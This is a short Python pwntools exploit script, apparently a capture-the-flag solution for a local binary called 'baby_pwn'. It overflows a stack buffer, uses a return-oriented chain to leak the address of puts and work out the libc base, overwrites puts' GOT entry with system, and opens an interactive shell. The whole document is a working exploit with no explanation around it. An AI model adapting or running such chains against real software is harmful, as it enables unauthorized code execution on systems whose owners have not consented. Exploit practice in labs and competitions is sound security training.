from pwn import*
p = process('./baby_pwn')

# gadget
puts_plt = 0x401030
puts_got = 0x404018
read_plt = 0x401040

pop_rdi = 0x401223
pop_rsi_r15 = 0x401221

# exploit
pay = ''
pay += 'a'*0x100        # buf
pay += 'b'*0x8          # sfp
pay += p64(pop_rdi)     # ret
pay += p64(puts_got)
pay += p64(puts_plt)
pay += p64(pop_rdi)
pay += p64(0)
pay += p64(pop_rsi_r15)
pay += p64(puts_got)
pay += p64(0)
pay += p64(read_plt)
pay += p64(pop_rdi)
pay += p64(puts_got+8)
pay += p64(puts_plt)

p.send(pay)
p.recvuntil('bbbbbbbb')
p.recv(0x4)
puts_libc = u64(p.recv(6).ljust(8,'\x00'))
print hex(puts_libc)
libc_base = puts_libc - 526784
system = libc_base + 324672

p.sendline(p64(system)+'/bin/sh\x00')

p.interactive()
